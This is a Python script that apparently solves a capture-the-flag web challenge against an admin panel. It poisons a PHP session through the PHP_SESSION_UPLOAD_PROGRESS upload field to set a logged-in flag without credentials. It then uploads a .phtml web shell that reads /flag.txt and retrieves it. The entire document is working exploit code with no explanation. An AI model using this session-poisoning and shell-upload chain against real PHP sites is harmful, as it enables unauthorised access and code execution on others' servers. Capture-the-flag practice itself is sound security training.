import requests
import urllib.parse

BASE_URL = "https://admin-panel-984da055ebe9.instancer.sekai.team"
SESSION_ID = "osuadminpwnd"

sess = requests.Session()
hostname = urllib.parse.urlparse(BASE_URL).hostname
sess.cookies.set("PHPSESSID", SESSION_ID, domain=hostname)

poison_payload = "upload_progress_|a:0:{}logged_in|b:1;"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, poison_payload),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "osu!", "text/plain"),
}

r1 = sess.post(f"{BASE_URL}/login.php", files=files, allow_redirects=False, timeout=10)
print("Poison status:", r1.status_code)

admin_page = sess.get(f"{BASE_URL}/admin.php", timeout=10)
print("Admin page status:", admin_page.status_code)
print("Logged in?", "system stats" in admin_page.text.lower())

if "system stats" not in admin_page.text.lower():
    print("Failed to poison session")
    exit()

shell_body = "<?=file_get_contents('/flag.txt');?>"
shell_files = {
    "file": ("shell.phtml", shell_body, "application/octet-stream"),
}
r2 = sess.post(f"{BASE_URL}/admin.php", files=shell_files, allow_redirects=False, timeout=10)
print("Upload status:", r2.status_code)
print("Upload headers:", r2.headers)

location = r2.headers.get("Location")
if not location:
    print("No Location header; cannot proceed")
else:
    if not location.startswith("http"):
        if not location.startswith("/"):
            location = "/" + location
        location = f"{BASE_URL}{location}"
    flag_resp = sess.get(location, timeout=10)
    print("Flag status:", flag_resp.status_code)
    print("Flag body:", flag_resp.text.strip())
